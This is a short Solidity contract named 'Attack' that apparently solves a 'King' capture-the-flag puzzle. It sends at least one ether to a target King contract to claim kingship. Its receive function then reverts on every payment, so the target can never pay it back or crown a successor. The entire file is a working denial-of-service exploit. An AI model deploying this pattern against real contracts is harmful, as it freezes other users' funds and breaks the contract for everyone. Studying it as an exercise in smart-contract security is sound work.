// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Attack {
    constructor(address kingContract) payable {
        require(msg.value >= 1 ether, "send enough eth");
        // Send ether to the King contract to claim kingship
        (bool success, ) = kingContract.call{value: msg.value}("");
        require(success, "Failed to claim kingship");
    }

    // Revert any ether sent to this contract
    receive() external payable {
        revert("eth cant be sent");
    }
}
